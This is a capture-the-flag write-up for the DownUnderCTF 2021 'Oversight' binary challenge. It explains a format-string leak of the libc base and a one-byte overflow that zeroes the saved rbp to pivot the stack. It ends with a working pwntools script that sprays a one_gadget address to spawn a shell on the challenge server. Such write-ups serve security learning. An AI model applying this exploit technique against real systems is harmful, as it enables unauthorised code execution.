# Oversight

![](/2021/DownUnderCTF2021/Oversight/images/1.png)

Challenge give me ELF file oversight and libc-2.27.so

![](/2021/DownUnderCTF2021/Oversight/images/2.png)

Let reverse it

![](/2021/DownUnderCTF2021/Oversight/images/3.png)

The main function, do nothing but call `wait()`

![](/2021/DownUnderCTF2021/Oversight/images/4.png)

`wait()` function, get 5 byte of us, convert to num and leak the stack base address. The format string vul is converted to only leak, no overwrite. 

![](/2021/DownUnderCTF2021/Oversight/images/5.png)

`introduce()` do nothing

![](/2021/DownUnderCTF2021/Oversight/images/6.png)

`Get_num_bytes()` function, read 4 byte input and convert to num, compare with 0x100, I have checked the interger overflow (-1) and it can not bypass.

![](/2021/DownUnderCTF2021/Oversight/images/7.png)

Echo function create array length 256 and call `echo_innert()`

![](/2021/DownUnderCTF2021/Oversight/images/8.png)

The last function is `echo_inner()`, and luckily, we found the bug

A1 is the address of v2 array, with locate in stack frame of echo function, a2 is the size we input in get_num_bytes function, the max size we can choose is 256, and instruction a1[256] = 0 will cause one byte overflow on echo function. The v2 array located at rbp-0x100, so a1[256] is the lowest byte of rbp, and we can change it to \x00.

If you haved solved some one byte overflow challenge before, you will know that change the last byte of rbp to \x00 will let you control the return address if 2 instruction leave, ret call 2 times. And the address we control is in the v2 array.

It happen because the instruction `leave` is the compare of 2 instruction `mov rsp, rbp` and `pop rbp`.

For example, let look the stack before the `fread()` call in echo_inner

![](/2021/DownUnderCTF2021/Oversight/images/9.png)

The white part is the array v2 in `echo`, the rbp of `echo_inner` is 0x7fffffffdca0 and the rbp of `echo` is 0x00007fffffffdda0. 

Notice that we are in the echo_inner function now, but the array causing the overflow is in the `echo` function, and the rbp we overwrite is the echo’s rbp at 0x00007fffffffdda0.

Oke, see what happen if we input which 256 ‘A’

![](/2021/DownUnderCTF2021/Oversight/images/10.png)

You can see that last byte at 0x00007fffffffdda0 change to \x00 and now rbp point to somewhere on v2 array (with we can control data on it)

Continue to the return of `echo`, after `leave` instructions

![](/2021/DownUnderCTF2021/Oversight/images/11.png)

Rbp now point to 0x7fffffffdd00, and rsp is 0x7fffffffdda8, is the return address to `get_num_bytes` funtions, ret instruction call and we go back to `get_num_bytes`.

At `get_num_bytes` function, we call `leave, ret`, which `mov rsp, rbp`, `pop rbp` and `ret`

The rbp is 0x7fffffffdd00 so the stack will 0x7fffffffdd00 same, and after `pop rbp`, the stack now located at 0x7fffffffdd08, and the value after 0x7fffffffdd08 will our rop chain.

See the stack for more understand

![](/2021/DownUnderCTF2021/Oversight/images/12.png)

What we push in the white part will be our rop chain.

## What we can do?

  - We can leak one address on the stack using format string. Since the ELF enable PIE, we have 2 base need leak. We can leak PIE and recall main to leak libc base. But in this challenge, we only need to leak libc base.

  - We will leak libc base at the return address of main, the value is `<__libc_start_main + 231>` , it depend on version libc they gived (2.27).

![](/2021/DownUnderCTF2021/Oversight/images/13.png)

## Final exploit

  - We will use the format string to leak the return address of main, with have offset 27, calculate the base address of libc by minus 0x21bf7.

  - We push the ROP to the right placement on v2.

  - We will use one byte overflow to control the rbp to return to our ROPchain.


There is a small problem here, although the last 1.5 bytes of the stack address are fixed, it depends on the environment variables. For example, an application running at `/home/cobra/Desktop/` and an application running at `/home/cobra/Desktop/DuCTF/` will have a different stack address, although the last 1.5 bytes it will not change each run time. So if you want to use a full rop chain like `pop_rdi, /bin/sh, system`. You'll need to bruteforce a little bit to get the correct placement in the v2. Because the stack while running on remote server will be different in environment variables than running locally. But at this challange, I use one_gadget so no need to bruteforce.

![](/2021/DownUnderCTF2021/Oversight/images/14.png)

We have 3 one_gadget, I used the first gadget, because it so hard to control value [rsp + 0x70] or [rsp + 0x30]. The condition rsp & 0xf == 0 is always true, because we have overwrite rbp == 0, then pop rbp, and ret will pop rsp 2 time, so it meets the condition. Register rcx == 0 will also always succeed, when calling printf() it calls the instructions mov rcx, rax and since eax has been xor before, rcx will be assigned = 0 after printf execution, i don’t know why printf need that instruction LOL.

![](/2021/DownUnderCTF2021/Oversight/images/15.png)

So we have all thing to have a payload, just fill 256 byte of v2 by 32 address of one_gadget

File [solve.py](/2021/DownUnderCTF2021/Oversight/solve.py)

```python
from pwn import *
s = remote('pwn-2021.duc.tf', 31909)
#s = process('./oversight')
#raw_input('DEBUG')
s.sendline(b'')
s.sendlineafter(b'Pick a number: ', b'27')
s.recvuntil(b'is: ')
libc_start_main_leak = int(s.recvline().strip().decode('utf-8'), 16)
print(hex(libc_start_main_leak))
'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
'''
libc_base = libc_start_main_leak - 0x0000000000021bf7
one_gadget = libc_base + 0x4f3d5
print(hex(libc_base))
print(hex(one_gadget))
s.sendlineafter(b'(max 256)? ', b'256')
payload = p64(one_gadget) * 32
s.sendline(payload)
s.interactive()
```

![](/2021/DownUnderCTF2021/Oversight/images/16.png)

`flag: DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}`

